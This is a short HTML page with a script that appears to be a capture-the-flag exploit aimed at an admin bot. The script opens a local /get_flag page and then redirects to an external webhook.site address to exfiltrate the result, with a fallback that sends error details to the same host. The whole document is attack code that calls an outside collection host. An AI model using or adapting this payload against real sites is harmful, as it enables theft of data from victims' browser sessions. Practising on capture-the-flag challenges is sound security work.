<!DOCTYPE html>
<html>
  <body>
    <script>
      // Open the /get_flag page from the same origin as the bot
      const win = window.open("http://127.0.0.1:3000/get_flag", "_blank");

      // Wait for it to load
      setTimeout(() => {
        try {
          // Redirect the new window to exfiltrate the flag
          win.location = "https://webhook.site/b9df327a-7a64-4657-a079-8b71dbe1cf29";
        } catch (e) {
          // If it fails, fallback: exfiltrate via opener
          window.location = "https://webhook.site/b9df327a-7a64-4657-a079-8b71dbe1cf29?error=" + encodeURIComponent(e.message);
        }
      }, 2000);
    </script>
  </body>
</html>
